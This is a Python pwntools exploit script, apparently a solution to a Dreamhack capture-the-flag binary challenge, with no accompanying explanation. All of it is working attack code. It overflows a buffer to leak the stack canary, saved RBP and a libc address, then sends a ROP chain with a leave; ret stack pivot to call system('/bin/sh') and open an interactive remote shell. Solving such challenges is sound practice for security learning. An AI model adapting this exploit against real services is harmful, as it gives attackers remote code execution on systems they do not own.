#!/usr/bin/python3
from pwn import *

context.binary = exe = ELF('./prob_patched')
libc = ELF('./libc.so.6')

p = remote("host8.dreamhack.games", 23101)

payload = b'A'*169
p.sendafter(b"OMG BOF", payload)
p.recvuntil(b'A' * 169)
canary = u64(b'\x00' + p.recv(7))
rbp = u64(p.recv(6).ljust(8, b'\x00'))
log.success(f'Canary: {hex(canary)}')
log.success(f'Saved RBP: {hex(rbp)}')

payload_loop = b'A' * 168
payload_loop += p64(canary)
payload_loop += p64(rbp) 
payload_loop += b'\xc4'  
p.sendafter(b'OMG BOF', payload_loop)

payload_leak_libc = b'A' * 168
payload_leak_libc += b'\x41' + p64(canary)[1:8] 
payload_leak_libc += b'B' * 8 
p.sendafter(b'OMG BOF', payload_leak_libc)

p.recvuntil(b'B' * 8)
libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
log.success(f'Libc Base: {hex(libc_leak)}')
libc.address = libc_leak - 0x2a1ca
pop_rdi = libc.address + 0x000000000010f78b
leave_ret = libc.address + 0x00000000000299d2
ret = libc.address + 0x000000000002882f
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.sym['system']

rop_chain = p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(ret) + p64(system)

payload_pwn = rop_chain.ljust(168, b'\x00')
payload_pwn += p64(canary)
buf_addr = rbp - 0xb0 - 0xa0
payload_pwn += p64(buf_addr - 8)
payload_pwn += p16(leave_ret & 0xFFFF)

p.sendafter(b'OMG BOF', payload_pwn)


p.interactive()